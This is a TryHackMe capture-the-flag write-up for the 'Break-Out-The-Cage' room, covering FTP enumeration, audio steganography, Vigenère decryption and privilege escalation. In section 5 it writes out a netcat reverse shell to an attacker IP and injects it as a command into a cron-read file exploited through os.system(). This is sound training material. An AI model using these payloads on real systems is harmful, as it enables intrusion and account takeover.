---
layout: post
title: "TryHackMe — Break-Out-The-Cage [Writeup]"
date: 2026-05-13
category: writeup
platform: TryHackMe
difficulty: Medium
tags:
  - FTP
  - Steganography
  - Cryptography
  - Python
  - Cron Abuse
  - Privilege Escalation
excerpt: "A Nicolas Cage themed room involving anonymous FTP, audio steganography, Vigenère decryption, and cron job abuse."
---

## Overview

Cage is a Nicolas Cage themed room that chains together several distinct techniques: anonymous FTP access, base64 encoding, audio steganography, Vigenère cipher decryption, and cron job abuse. No single step is particularly complex — but connecting them requires lateral thinking.

**Attack chain:**
```
Recon → FTP (anonymous) → Base64 decode → Spectrogram analysis
→ Vigenère decrypt → Shell as weston → Cron abuse → Shell as cage
→ Vigenère decrypt (again) → su root → Root mail flag
```

---

## 1. Recon

Started with an nmap scan to identify open services:

```bash
nmap -sV -sC 10.48.136.40
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-13 19:48 +0200
Nmap scan report for 10.48.136.40
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.223.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds

```

Notable ports:
- **21** — FTP (anonymous login enabled)
- **22** — SSH
- **80** — HTTP (Apache)

Then ran ffuf to enumerate web directories:

```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt \
  -u http://<TARGET_IP>/FUZZ \
  -mc 301,302,403
```

Found an `/auditions` directory containing an MP3 file.

---

## 2. FTP — Anonymous Login

```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: (blank)
```

Retrieved a file containing base64 encoded text. Decoded it:

```bash
base64 -d encoded_file.txt
```

The output was Vigenère ciphertext — not yet readable without a key.

---

## 3. Audio Steganography — Finding the Key

Downloaded the MP3 from `/auditions`:

```bash
wget http://<TARGET_IP>/auditions/must_practice_corrupt_file.mp3
```

Opened it in Audacity and switched the track to **Spectrogram view** (click the track dropdown → Spectrogram). Zoomed into the high frequency range (~2000–8000 Hz) to reveal text hidden in the audio frequencies:

**Key found: `lessonTwo`**

This is a classic steganography technique — data encoded visually into the frequency spectrum of an audio file, invisible to the human ear but visible as shapes when rendered as a spectrogram.

---

## 4. Vigenère Decryption — Round 1

With the key `lessonTwo`, decrypted the ciphertext from the FTP file using [dcode.fr/vigenere-cipher](https://www.dcode.fr/vigenere-cipher).

This revealed credentials — used them to SSH in as **weston**.

---

## 5. Privilege Escalation — weston → cage

Enumerated group membership:

```bash
id
# uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```

Being in the `cage` group meant write access to:

```
/opt/.dads_scripts/.files/.quotes
```

This file is read by `/opt/.dads_scripts/spread_the_quotes.py`, which runs as `cage` via a cron job every minute:

```python
lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)   # <-- unsanitized input passed to shell
```

The `os.system()` call executes whatever is in the quotes file as a shell command. Created a reverse shell script and injected it:

```bash
# Create the reverse shell
cat << EOF > /tmp/rev
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f
EOF
chmod +x /tmp/rev

# Inject into quotes file
printf 'revshell time; /tmp/rev\n' > /opt/.dads_scripts/.files/.quotes
```

Started a listener on Kali:

```bash
nc -lvnp 4444
```

Within a minute the cron job fired and a shell dropped as **cage**.

---

## 6. Privilege Escalation — cage → root

In cage's home directory found an email:

```bash
cat email_3
```

The email mentioned a colleague named Sean (username: `root`) who left a note:

```
haiinspsyanileph
```

The email heavily hinted at the key — the word **"face"** was emphasised repeatedly.

Decrypted using Vigenère with key `face` → revealed root's password.

Upgraded to a proper TTY first:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then:

```bash
su root
# enter decrypted password
```

---

## 7. Root Flag

The flag wasn't in `/root/root.txt` — it was in root's mail:

```bash
cat /var/mail/root
```

---

## Key Takeaways

| Technique | Lesson |
|---|---|
| Anonymous FTP | Always check FTP with anonymous login during recon |
| Audio steganography | Spectrogram view in Audacity reveals hidden visual data |
| Vigenère cipher | Classic symmetric cipher — hints about the key are often in the surrounding context |
| `os.system()` with unsanitised input | Any script that passes user-controlled data to a shell function is exploitable |
| Cron job abuse | If you can write to a file executed by cron, you control that user's shell |

---

## Tools Used

- nmap
- ffuf
- Audacity (spectrogram view)
- dcode.fr (Vigenère decryption)
- netcat
- Python pty

---

*Room completed on TryHackMe. Write-up by [Wandipa Marema] — [2026-05-13]*
